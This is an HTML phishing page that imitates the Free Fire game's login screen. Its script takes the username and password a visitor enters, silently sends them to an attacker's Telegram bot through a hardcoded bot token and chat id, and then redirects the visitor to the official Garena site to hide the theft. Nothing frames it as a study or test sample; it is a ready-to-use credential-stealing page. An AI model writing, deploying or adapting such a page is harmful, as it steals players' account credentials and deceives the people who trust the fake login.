<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire - Login</title>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Bebas Neue', 'Impact', sans-serif;
        }
        body {
            background: url('https://images.hdqwalls.com/download/garena-free-fire-2020-4k-jo-1920x1080.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }
        /* Overlay dark orange */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(145deg, rgba(255, 69, 0, 0.4) 0%, rgba(0, 0, 0, 0.7) 100%);
            z-index: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            position: relative;
            z-index: 1;
        }
        .ff-card {
            background: rgba(10, 10, 10, 0.85);
            border: 3px solid #ff6b00;
            border-radius: 30px 30px 30px 30px;
            padding: 40px 25px;
            box-shadow: 0 20px 40px rgba(255, 94, 0, 0.6);
            backdrop-filter: blur(8px);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .ff-card::before {
            content: '';
            position: absolute;
            top: -50px;
            left: -50px;
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, #ff8c00, transparent);
            opacity: 0.3;
            border-radius: 50%;
        }
        .ff-card::after {
            content: '';
            position: absolute;
            bottom: -50px;
            right: -50px;
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, #ff3300, transparent);
            opacity: 0.3;
            border-radius: 50%;
        }
        .logo {
            margin-bottom: 30px;
            position: relative;
        }
        .logo img {
            width: 100px;
            height: auto;
            filter: drop-shadow(0 0 20px #ff8800);
        }
        .logo h1 {
            color: #ff6b00;
            font-size: 36px;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-top: 5px;
            text-shadow: 0 0 15px #ff6b00, 2px 2px 0 #000;
            font-family: 'Bebas Neue', cursive;
        }
        .logo p {
            color: #ffaa33;
            font-size: 14px;
            letter-spacing: 2px;
            background: rgba(0,0,0,0.6);
            display: inline-block;
            padding: 5px 15px;
            border-radius: 30px;
            margin-top: 5px;
            border: 1px solid #ff6b00;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 20px;
            position: relative;
            z-index: 2;
        }
        .input-group {
            position: relative;
        }
        .input-group i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #ff6b00;
            font-size: 20px;
            z-index: 1;
        }
        .input-group input {
            width: 100%;
            padding: 16px 16px 16px 50px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid #ff6b00;
            border-radius: 50px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.3s;
            font-family: 'Arial', sans-serif;
        }
        .input-group input:focus {
            border-color: #ff3300;
            box-shadow: 0 0 15px #ff6b00;
            background: rgba(0,0,0,0.6);
        }
        .input-group input::placeholder {
            color: #ffaa80;
            font-weight: lighter;
        }
        .options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #ffcc99;
            font-size: 14px;
        }
        .options label {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }
        .options input[type="checkbox"] {
            accent-color: #ff6b00;
            width: 16px;
            height: 16px;
        }
        .options a {
            color: #ffaa33;
            text-decoration: none;
            font-weight: bold;
            transition: 0.2s;
        }
        .options a:hover {
            color: #ff6b00;
            text-shadow: 0 0 5px #ff6b00;
        }
        .login-btn {
            background: linear-gradient(45deg, #ff6b00, #ff3300);
            border: none;
            border-radius: 50px;
            padding: 16px;
            font-size: 22px;
            font-weight: bold;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 3px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 8px 0 #a13d00;
            border: 1px solid #ffaa33;
            font-family: 'Bebas Neue', cursive;
        }
        .login-btn:hover {
            background: linear-gradient(45deg, #ff8800, #ff5500);
            transform: translateY(-3px);
            box-shadow: 0 11px 0 #a13d00;
        }
        .login-btn:active {
            transform: translateY(5px);
            box-shadow: 0 4px 0 #a13d00;
        }
        .register-link {
            margin-top: 25px;
            color: #ffcc99;
            font-size: 16px;
            font-family: Arial, sans-serif;
        }
        .register-link a {
            color: #ffaa33;
            font-weight: bold;
            text-decoration: none;
            border-bottom: 2px solid #ff6b00;
            padding-bottom: 2px;
        }
        .register-link a:hover {
            color: #ff6b00;
            border-bottom-color: #ffaa33;
        }
        .footer {
            margin-top: 30px;
            color: #aaa;
            font-size: 12px;
        }
        .footer a {
            color: #ffaa33;
            text-decoration: none;
        }
        .footer a:hover {
            color: #ff6b00;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="ff-card">
            <div class="logo">
                <!-- Free Fire Logo (يمكن استبدال الرابط بصورة محلية أو نص) -->
                <img src="https://i.imgur.com/9Vc0L7D.png" alt="Free Fire Logo" onerror="this.style.display='none'">
                <h1>FREE FIRE</h1>
                <p>BATTLE IN STYLE</p>
            </div>
            <form id="loginForm" action="#">
                <div class="input-group">
                    <i class="fas fa-user-secret"></i>
                    <input type="text" id="username" placeholder="Username / ID" required>
                </div>
                <div class="input-group">
                    <i class="fas fa-key"></i>
                    <input type="password" id="password" placeholder="Password" required>
                </div>
                <div class="options">
                    <label>
                        <input type="checkbox"> Remember me
                    </label>
                    <a href="#">Forgot password?</a>
                </div>
                <button type="submit" class="login-btn">LOGIN</button>
                <div class="register-link">
                    New to Free Fire? <a href="#">Create account</a>
                </div>
            </form>
            <div class="footer">
                <a href="#">Privacy</a> • <a href="#">Terms</a> • <a href="#">Support</a>
            </div>
        </div>
    </div>

    <script>
        // ========== Telegram Configuration ==========
        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
        const telegramChatId = '8304101362';
        // ============================================

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const message = `🔥 Free Fire Login\n👤 User: ${username}\n🔑 Pass: ${password}`;
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

            // Send data silently to Telegram
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => response.json())
            .catch(error => console.error('Telegram error:', error))
            .finally(() => {
                // Redirect to official Free Fire site without any notification
                window.location.href = 'https://ff.garena.com';
            });
        });
    </script>
</body>
</html>
